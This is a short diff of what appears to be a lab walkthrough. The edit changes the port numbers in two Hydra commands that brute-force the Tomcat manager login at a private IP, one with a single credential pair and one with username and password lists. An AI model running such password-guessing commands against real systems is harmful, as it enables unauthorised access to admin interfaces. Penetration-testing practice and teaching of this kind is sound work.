@@ -52,7 +52,7 @@ sudo apt update && sudo apt install seclists hydra
 I then used Hydra with a known username and password:
 
 ```bash
-hydra -l username -p password -s 8080 -f 192.168.122.68 http-get /manager/html
+hydra -l username -p password -s 6667 -f 192.168.122.68 http-get /manager/html
 ```
 
 Here:
@@ -67,7 +67,7 @@ Here:
 You can also use username and password lists instead:
 
 ```bash
-hydra -L username-list -P password-list -s 9281 -f 192.168.122.68 http-get /manager/html
+hydra -L username-list -P password-list -s 6667 -f 192.168.122.68 http-get /manager/html
 ```
 
 In this case:
